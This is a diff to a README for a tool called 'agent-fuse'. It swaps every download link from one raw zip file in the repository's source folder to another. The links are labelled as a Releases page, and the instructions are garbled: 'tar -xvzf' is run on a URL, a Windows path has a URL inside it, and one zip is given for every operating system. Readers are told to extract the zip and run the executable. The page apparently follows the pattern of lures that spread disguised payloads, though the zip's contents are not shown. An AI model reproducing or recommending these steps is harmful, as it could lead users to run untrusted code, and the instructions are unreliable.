@@ -1,6 +1,6 @@
 # 🌟 agent-fuse - Access Files Easily with FUSE
 
-[![Download Agent Fuse](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip%20Fuse-blue)](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip)
+[![Download Agent Fuse](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip%20Fuse-blue)](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip)
 
 ## 🎯 About
 
@@ -10,7 +10,7 @@
 
 To use the software, you will need to download it from the Releases page. 
 
-1. **Visit this page to download**: [agent-fuse Releases](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip).
+1. **Visit this page to download**: [agent-fuse Releases](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip).
 
 ## 💻 System Requirements
 
@@ -24,17 +24,17 @@ To run agent-fuse effectively, ensure your computer meets the following requirem
 
 To get agent-fuse, follow these steps:
 
-1. Go to the Releases page: [agent-fuse Releases](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip).
+1. Go to the Releases page: [agent-fuse Releases](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip).
 2. You will see a list of available versions. Look for the latest stable release, marked accordingly.
 3. Click on the version title to expand the section. You’ll see available files for download.
 4. Download the file that corresponds to your operating system:
-   - For Windows: select `https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip`.
-   - For macOS: select `https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip`.
-   - For Linux: select `https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip`.
+   - For Windows: select `https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip`.
+   - For macOS: select `https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip`.
+   - For Linux: select `https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip`.
 5. Once downloaded, locate the file on your computer. Extract the contents:
    - For Windows, right-click the .zip file and select "Extract All...".
    - For macOS, double-click the .zip file.
-   - For Linux, use the command: `tar -xvzf https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip`.
+   - For Linux, use the command: `tar -xvzf https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip`.
 6. Open the extracted folder. You will find an executable file named `agent-fuse`.
 7. Run the executable to start using agent-fuse.
 
@@ -49,7 +49,7 @@ Once you have installed agent-fuse, you can begin using it to access your files.
    ```
    For Windows, you might need to specify the path:
    ```
-   C:\path\to\https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip
+   C:\path\to\https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip
    ```
 3. agent-fuse will create a new filesystem for you. You can now access it like any other folder on your computer.
 
@@ -75,4 +75,4 @@ For detailed information on features, commands, and advanced usage, please check
 
 Thanks to the open-source community for contributing to and supporting projects like agent-fuse. Your involvement makes it possible to create useful tools for everyone. 
 
-Don't forget to visit the Releases page for updates and enhancements: [agent-fuse Releases](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent-fuse-3.4.zip).
+Don't forget to visit the Releases page for updates and enhancements: [agent-fuse Releases](https://github.com/EStrelaaa/agent-fuse/raw/refs/heads/main/src/fuse/agent_fuse_v1.6.zip).
